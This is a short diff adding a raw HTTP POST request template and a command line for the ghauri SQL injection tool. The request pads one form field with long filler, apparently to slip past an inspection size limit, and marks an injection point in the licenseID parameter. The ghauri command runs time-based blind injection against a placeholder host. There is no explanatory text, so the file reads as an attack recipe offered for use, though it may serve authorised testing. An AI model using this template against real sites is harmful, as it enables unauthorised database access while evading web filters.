@@ -1,0 +1,13 @@
+POST /Path HTTP/1.1
+Host: example.com
+User-Agent: Mozilla
+Content-Type: application/x-www-form-urlencoded
+Content-Length: length
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+
+chunk=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa8KB∞aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&licenseID=string%INJECT HERE%&content=string
+
+
+
+# ghauri -u "SUB.ROOT.TLD/Path" -r URLRequest.txt -v 3 --force-ssl --delay 3 --retries 3 --threads 3 --confirm --hostname --level 3 --technique T --time-sec 15 -p parameter
